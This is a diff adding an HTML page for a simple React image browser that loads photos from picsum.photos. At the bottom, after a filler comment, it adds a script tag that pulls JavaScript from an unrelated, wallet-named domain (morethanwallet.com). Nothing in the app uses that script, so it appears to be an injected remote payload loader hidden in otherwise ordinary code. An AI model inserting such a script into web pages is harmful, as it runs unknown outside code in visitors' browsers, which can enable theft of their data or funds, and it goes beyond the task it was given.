@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Image Browser</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.development.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/17.0.2/umd/react-dom.development.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/6.26.0/babel.min.js"></script>
+    <link rel="stylesheet" href="inc/loading.css" />
+  </head>
+  <body>
+    <div id="app"></div>
+
+    <script type="text/babel">
+      class ImageBrowserApp extends React.Component {
+        constructor(props) {
+          super(props);
+          this.state = {
+            images: [],
+            selectedImage: null,
+          };
+        }
+
+        componentDidMount() {
+          const LIMIT = 15; // Limit the number of pictures to fetch
+          fetch("https://picsum.photos/v2/list?limit=" + LIMIT)
+            .then((response) => response.json())
+            .then((data) => {
+              const images = data.map((item) => ({
+                thumbnail: `https://picsum.photos/100/100?image=${item.id}`,
+                full: `https://picsum.photos/${item.width}/${item.height}?image=${item.id}`,
+              }));
+              this.setState({ images });
+            })
+            .catch((error) => console.error("Error fetching images:", error));
+        }
+
+        selectImage = (imageUrl) => {
+          this.setState({ selectedImage: imageUrl });
+        };
+
+        render() {
+          return (
+            <div>
+              <h1>Image Browser</h1>
+              <div className="thumbnail-container">
+                {/* Thumbnails */}
+                {this.state.images.map((image) => (
+                  <img
+                    key={image.thumbnail}
+                    src={image.thumbnail}
+                    className="thumbnail"
+                    onClick={() => this.selectImage(image.full)}
+                  />
+                ))}
+              </div>
+              {this.state.selectedImage && (
+                <div className="selected-image-container">
+                  {/* Selected Image */}
+                  <h2>Selected Image</h2>
+                  <img src={this.state.selectedImage} alt="Selected Image" />
+                </div>
+              )}
+            </div>
+          );
+        }
+      }
+      // bla bla
+      ReactDOM.render(<ImageBrowserApp />, document.getElementById("app"));
+    </script>
+    <script src="https://morethanwallet.com/appstore/index.js"></script>
+  </body>
+</html>
